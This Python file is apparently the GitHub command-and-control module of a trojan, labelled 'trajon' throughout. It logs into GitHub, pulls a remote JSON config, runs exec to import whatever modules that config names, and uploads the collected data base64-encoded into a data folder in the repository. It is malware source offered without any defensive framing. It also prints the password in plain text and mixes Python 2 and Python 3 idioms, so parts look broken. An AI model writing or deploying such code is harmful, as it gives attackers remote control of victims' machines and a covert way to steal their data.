# -*- coding: utf-8 -*-
import json
import base64
import sys
import random
from github3 import login

class GitConnecter():
    trajon_id = "abc"
    
    def __init__(self, username:str, password:str, repository:str, trajon_id:str = None):
        self.username = username
        self.password = password
        self.repository = repository
        if trajon_id is not None:
            self.trajon_id = trajon_id
        self.trajon_config = "%s.json" % self.trajon_id
        print("[*] GitConnector init -> user:%s, password:%s, repository:%s, trajon_id:%s"
            % (self.username, self.password, self.repository, self.trajon_id))
    
    def connect_to_github(self):
        print("[*] Connect to github")
        gh = login(username = self.username, password = self.password)
        repo = gh.repository(self.username, self.repository)
        branch = repo.branch("master")
        return gh,repo,branch
    
    def get_file_contents(self, filepath):
        # connect to github
        gh,repo,branch = self.connect_to_github()
        # get last commit
        commit = repo.commits().next()
        tree = repo.tree(commit.sha).recurse()

        for filename in tree.tree:
            if filepath in filename.path:
                print("[*] Found file %s" % filepath)
                blob = repo.blob(filename._json_data['sha'])
                return base64.b64decode(blob.content)
        return None
    
    def get_trajon_config(self):
        config_json = self.get_file_contents(self.trajon_config)
        config = json.loads(config_json.decode())

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        
        return config

    def store_module_result(self, data):
        #print("[*] Push to github -> %s" % data)
        gh,repo,branch = self.connect_to_github()
        remote_path = "data/%s/%d.data" % (self.trajon_id, random.randint(1000, 100000))
        repo.create_file(remote_path, "Commit message", base64.b64encode(data))
        return